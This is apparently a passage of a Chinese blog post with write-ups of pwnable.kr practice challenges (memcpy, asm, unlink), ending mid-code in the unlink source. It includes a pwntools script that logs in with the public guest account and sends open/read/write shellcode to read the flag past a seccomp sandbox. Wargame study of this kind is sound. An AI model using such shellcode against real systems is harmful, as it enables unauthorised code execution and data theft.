<p>代码着实是比较长，耐心看看叭</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title function_">rdtsc</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;rdtsc&quot;</span>);	<span class="comment">//这个指令可以获得程序运行期间的CPU周期数，用以测量程序的运行时间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">slow_memcpy</span><span class="params">(<span class="type">char</span>* dest, <span class="type">const</span> <span class="type">char</span>* src, <span class="type">size_t</span> len)</span>&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;		<span class="comment">//这种拷贝方式属于一个字节一个字节的拷贝，效率低</span></span><br><span class="line">		dest[i] = src[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">fast_memcpy</span><span class="params">(<span class="type">char</span>* dest, <span class="type">const</span> <span class="type">char</span>* src, <span class="type">size_t</span> len)</span>&#123;</span><br><span class="line">	<span class="type">size_t</span> i;</span><br><span class="line">	<span class="comment">// 64-byte block fast copy</span></span><br><span class="line">	<span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">		i = len / <span class="number">64</span>;</span><br><span class="line">		len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line">		<span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">			__asm__ __volatile__ (		<span class="comment">//使用汇编指令mobdpa进行拷贝</span></span><br><span class="line">			<span class="string">&quot;movdqa (%0), %%xmm0\n&quot;</span></span><br><span class="line">			<span class="string">&quot;movdqa 16(%0), %%xmm1\n&quot;</span></span><br><span class="line">			<span class="string">&quot;movdqa 32(%0), %%xmm2\n&quot;</span></span><br><span class="line">			<span class="string">&quot;movdqa 48(%0), %%xmm3\n&quot;</span></span><br><span class="line">			<span class="string">&quot;movntps %%xmm0, (%1)\n&quot;</span></span><br><span class="line">			<span class="string">&quot;movntps %%xmm1, 16(%1)\n&quot;</span></span><br><span class="line">			<span class="string">&quot;movntps %%xmm2, 32(%1)\n&quot;</span></span><br><span class="line">			<span class="string">&quot;movntps %%xmm3, 48(%1)\n&quot;</span></span><br><span class="line">			::<span class="string">&quot;r&quot;</span>(src),<span class="string">&quot;r&quot;</span>(dest):<span class="string">&quot;memory&quot;</span>);</span><br><span class="line">			dest += <span class="number">64</span>;</span><br><span class="line">			src += <span class="number">64</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// byte-to-byte slow copy</span></span><br><span class="line">	<span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line">	<span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);	<span class="comment">//_IONBF - unbuffered 将标准输出流指向标准输入流，大小至少为0字节</span></span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);	<span class="comment">//_IOLBF - line buffered 将标准输入指向标准输入，大小至少为0字节</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hey, I have a boring assignment for CS class.. :(\n&quot;</span>);	<span class="comment">//:(</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The assignment is simple.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;- What is the best implementation of memcpy?        -\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;- 1. implement your own slow/fast version of memcpy -\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;- 2. compare them with various size of data         -\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;- 3. conclude your experiment and submit report     -\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This time, just help me out with my experiment and get flag\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;No fancy hacking, I promise :D\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> t1, t2;</span><br><span class="line">	<span class="type">int</span> e;</span><br><span class="line">	<span class="type">char</span>* src;</span><br><span class="line">	<span class="type">char</span>* dest;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> low, high;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">	<span class="comment">// allocate memory</span></span><br><span class="line">    <span class="comment">// mmap函数返回值为映射到内存中的起始地址</span></span><br><span class="line">    <span class="comment">// 函数原型：void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);</span></span><br><span class="line">	<span class="type">char</span>* cache1 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);<span class="comment">//7表示可以被执行、读取、写入</span></span><br><span class="line">	<span class="type">char</span>* cache2 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">	src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> sizes[<span class="number">10</span>];	<span class="comment">//存放你输入的10次的size值</span></span><br><span class="line">	<span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// setup experiment parameters</span></span><br><span class="line">	<span class="keyword">for</span>(e=<span class="number">4</span>; e&lt;<span class="number">14</span>; e++)&#123;</span><br><span class="line">		low = <span class="built_in">pow</span>(<span class="number">2</span>,e<span class="number">-1</span>);	<span class="comment">//2^3 2^4 ...</span></span><br><span class="line">		high = <span class="built_in">pow</span>(<span class="number">2</span>,e);	<span class="comment">//2^4 2^5 ...</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;specify the memcpy amount between %d ~ %d : &quot;</span>, low, high);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);		<span class="comment">//输入的size变量必须小于low或者大于high</span></span><br><span class="line">		<span class="keyword">if</span>( size &lt; low || size &gt; high )&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;don&#x27;t mess with the experiment.\n&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		sizes[i++] = size;	<span class="comment">//存放到结果记录数组sizes中</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ok, lets run the experiment with your configuration\n&quot;</span>);</span><br><span class="line">	sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// run experiment</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">		size = sizes[i];</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;experiment %d : memcpy with buffer size %d\n&quot;</span>, i+<span class="number">1</span>, size);</span><br><span class="line">		dest = <span class="built_in">malloc</span>( size );	<span class="comment">//分配你指定的内存大小</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);		<span class="comment">// to eliminate cache effect</span></span><br><span class="line">		t1 = rdtsc();</span><br><span class="line">		slow_memcpy(dest, src, size);		<span class="comment">// byte-to-byte memcpy</span></span><br><span class="line">		t2 = rdtsc();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for slow_memcpy : %llu\n&quot;</span>, t2-t1);	<span class="comment">//输出两种拷贝方式的CPU周期差</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);		<span class="comment">// to eliminate cache effect</span></span><br><span class="line">		t1 = rdtsc();</span><br><span class="line">		fast_memcpy(dest, src, size);		<span class="comment">// block-to-block memcpy</span></span><br><span class="line">		t2 = rdtsc();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for fast_memcpy : %llu\n&quot;</span>, t2-t1);	<span class="comment">//输出两种拷贝方式的CPU周期差</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;thanks for helping my experiment!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;flag : ----- erased in this source code -----\n&quot;</span>);	<span class="comment">//:(</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外题目里有一个readme的说明，执行文件在9022端口：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">the compiled binary of &quot;memcpy.c&quot; source code (with real flag) will be executed under memcpy_pwn privilege if you connect to port 9022.</span><br><span class="line">execute the binary by connecting to daemon(nc 0 9022).</span><br></pre></td></tr></table></figure>
<p>程序大意就是分配了两个内存可能关键的指针用于实验，然后分别测试了10个不同大小的数据块在使用<code>slow_memcpy</code>和<code>fast_memcpy</code>时与标准<code>memcpy</code>时间相比的差值。</p>
<p>不知道为什么我编译后怎么运行都没有出问题....所以参考别人的博客来分析(https://www.cnblogs.com/p4nda/p/7162378.html)。</p>
<p>根据大佬的博客，问题是出在了<code>fast_memcpy</code>函数的一条汇编指令上：<code>movntps XMMWORD PTR, [edx],xmm0</code>。这道题本质想告诉我们的是内存的16字节对齐机制(32位的类型必须从一个32位边界开始，16位的类型必须从一个16位的边界开始，8位类型可以从任意位置开始)，对齐之后的内存单元会让CPU读起来更高效。</p>
<blockquote>
<p>现代计算机中，内存空间按照字节划分，理论上可以从任何起始地址访问任意类型的变量。但实际中在访问特定类型变量时经常在特定的内存地址访问，这就需要各种类型数据按照一定的规则在空间上排列，而不是顺序一个接一个地存放，这就是对齐。</p>
</blockquote>
<p>这里引用大佬调试的一张图作说明：</p>
<p><img
src="/img/入坑Pwn-刷题补坑/1071926-20170713193624165-1062732194.png" /></p>
<p>可以看到此时edx寄存器的值位<code>0x904c4a8</code>，末尾不是0，也就不是16字节对齐，所以出了错。印此我们每次申请的块的大小都应该是16字节对齐的。比如这样：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200223132409049.png" style="zoom:80%;" /></p>
<p>就可以通过了：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200223132433575.png" style="zoom:80%;" /></p>
<h2 id="asm">asm</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mommy! I think I know how to make shellcodes</span><br><span class="line"></span><br><span class="line">ssh asm@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LENGTH 128</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span>&#123;</span><br><span class="line">	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">	<span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;seccomp error\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(<span class="built_in">exit</span>), <span class="number">0</span>);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (seccomp_load(ctx) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		seccomp_release(ctx);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;seccomp error\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	seccomp_release(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> stub[] = <span class="string">&quot;\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> filter[<span class="number">256</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to shellcoding practice challenge.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If this does not challenge you. you should play &#x27;asg&#x27; challenge :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* sh = (<span class="type">char</span>*)mmap(<span class="number">0x41414000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">memset</span>(sh, <span class="number">0x90</span>, <span class="number">0x1000</span>);	<span class="comment">//使用0x90(NOP)进行初始化</span></span><br><span class="line">	<span class="built_in">memcpy</span>(sh, stub, <span class="built_in">strlen</span>(stub));		<span class="comment">//这里stub长度为45</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> offset = <span class="keyword">sizeof</span>(stub);	<span class="comment">//大小为118</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;give me your x64 shellcode: &quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>, sh+offset, <span class="number">1000</span>);	<span class="comment">//从标准输入中输入1000字节内容到sh+offset地址</span></span><br><span class="line"></span><br><span class="line">	alarm(<span class="number">10</span>);</span><br><span class="line">	chroot(<span class="string">&quot;/home/asm_pwn&quot;</span>);	<span class="comment">// you are in chroot jail. so you can&#x27;t use symlink in /tmp</span></span><br><span class="line">	sandbox();</span><br><span class="line">	((<span class="type">void</span> (*)(<span class="type">void</span>))sh)();	<span class="comment">//执行</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这道题要求输入一段长度为不超过1000字节的x64的shellcode，最终会执行。程序开始申请了了一段大小为<code>0x1000</code>的内存，并返回到其指针sh，并使用NOP(无操作指令)进行了初始化，然后先拷贝进去了一个stub到sh所指内存开头，之后会把你的输入读入到sh+offset的偏移地址，也就是stub的后面。先看一下这个stub写的什么意思吧(使用pwntools的disasm函数)：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200223134554001.png" /></p>
<p>可以看到么一个寄存器都和自己进行了异或，那结果当然是0了，所以这个stub相当于把所有的寄存器清零了。</p>
<p>下面开始写shellcode，根据题目要求，沙箱中做了限制，只能使用<code>open()，read()，write()</code>这三个函数。可以看到在代码的最后使用了chroot函数，该函数会切换目录到/home/asm_pwn，flag文件也在那里，所以我们的shellcode内容就是open(flag)
-&gt; read(flag) -&gt;
write(stdout)就可以了。使用pwntools的shellcraft完成：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> shellcraft	<span class="comment"># 用于编写shellcode</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context	<span class="comment"># 用于设置对象对象机器类型</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> ssh</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> asm	   <span class="comment"># 用于汇编shellcode代码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ssh = ssh(<span class="string">&#x27;asm&#x27;</span>, <span class="string">&#x27;pwnable.kr&#x27;</span>, port=<span class="number">2222</span>, password=<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">pwnable = ssh.connect_remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">9026</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)   <span class="comment"># 设置全局的操作系统和指令集</span></span><br><span class="line">shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">100</span>)</span><br><span class="line"><span class="comment"># print shellcode</span></span><br><span class="line"><span class="built_in">print</span> pwnable.recv()</span><br><span class="line">pwnable.send(asm(shellcode))</span><br><span class="line"><span class="built_in">print</span> pwnable.recvline()</span><br></pre></td></tr></table></figure>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200223142757591.png" style="zoom:80%;" /></p>
<p>有一说一pwntools太好用了......我以为shellcode基本都是纯敲出来的(抱头痛哭)</p>
<h2 id="unlink">unlink</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Daddy! how can I exploit unlink corruption?</span><br><span class="line"></span><br><span class="line">ssh unlink@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span></span><br><span class="line">	<span class="type">char</span> buf[<span class="number">8</span>];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unlink</span><span class="params">(OBJ* P)</span>&#123;	<span class="comment">//获取要删除节点的前后指针，并将其前驱节点和后驱节点的指针进行修改</span></span><br><span class="line">	OBJ* BK;</span><br><span class="line">	OBJ* FD;</span><br><span class="line">	BK=P-&gt;bk;</span><br><span class="line">	FD=P-&gt;fd;</span><br><span class="line">	FD-&gt;bk=BK;</span><br><span class="line">	BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">    <span class="comment">//声明三个结构体对象</span></span><br><span class="line">	OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">	OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">	OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span 